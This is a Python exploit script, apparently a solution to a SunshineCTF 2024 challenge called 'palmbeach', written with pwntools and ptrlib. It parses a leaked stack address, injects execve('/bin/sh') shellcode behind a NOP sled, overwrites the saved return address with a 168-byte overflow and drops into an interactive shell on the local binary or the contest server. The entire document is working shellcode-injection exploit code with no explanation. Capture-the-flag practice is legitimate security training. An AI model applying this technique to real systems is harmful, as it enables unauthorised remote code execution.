#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./palmbeach")
pwn.context.binary = pwn.ELF(exe.filepath)
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("2024.sunshinectf.games", 24603)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    io.recvuntil(b"Speed limit: ")
    shellcode_addr = int(io.recvline().strip(b"\n"), 16)

    shellcode = "mov rax, 0x68732f6e69622f;"
    shellcode += f"mov rbp, {hex(shellcode_addr)};"
    shellcode += "mov [rbp], rax;"
    shellcode += "mov rax, 59;"
    shellcode += "mov rdi, rbp;"
    shellcode += "mov rsi, 0;"
    shellcode += "mov rdx, 0;"
    shellcode += "syscall;"

    payload = b"\x90" * 0x30
    payload += pwn.asm(shellcode)
    payload = payload.ljust(168, b"\x90")
    payload += ptr.p64(shellcode_addr + 0x10)

    io.sendline(payload)

    io.interactive()
    return


if __name__ == "__main__":
    main()
